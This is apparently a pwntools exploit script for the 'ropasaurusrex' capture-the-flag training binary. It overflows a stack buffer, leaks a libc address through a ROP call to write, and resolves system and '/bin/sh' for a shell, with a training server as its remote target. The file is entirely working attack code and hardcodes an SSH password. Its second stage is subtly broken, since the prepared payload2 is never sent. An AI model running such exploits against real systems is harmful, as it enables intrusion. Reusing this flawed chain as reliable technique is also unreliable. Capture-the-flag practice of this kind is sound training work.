from pwn import *

if "REMOTE" not in args:

    env = {"LD_PRELOAD": "./home/buba98/ropasaurusrex/libc-2.27.so"}

    ssh = ssh("buba98", "127.0.0.1", password="Vinsent22!", port=2222)
    r = ssh.process("/home/buba98/ropasaurusrex/ropasaurusrex",)
    gdb.attach(r, """
        # b *0x0804841c
        # c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2014)

# 32 bit program with NX enabled
# 136 char array

BIN = ELF("./ropasaurusrex")
LIBC = ELF("./libc-2.27.so")

ptr_write = 0x0804830c
next_fun = 0x0804841d
got = 0x8049614

payload = b"A"*140
payload += p32(ptr_write)
payload += p32(next_fun)
payload += p32(1)
payload += p32(got)
payload += p32(4)
r.send(payload)


leak = u32(r.recv(4))
libc_base = leak - 0xe6f10
LIBC.address = libc_base
# system = libc_base + 0x003d200
system = LIBC.symbols["system"]
# binsh = libc_base + 0x17e0cf
binsh = next(LIBC.search(b"/bin/sh"))
print("[!] leak: %#x" % leak)
print("[!] libc: %#x" % libc_base)
print("[!] system: %#x" % system)
print("[!] binsh: %#x" % binsh)

payload2 = b"A"*140
payload2 += p32(next_fun)  # + p32(0) + p32(binsh)

r.send(payload)

r.interactive()
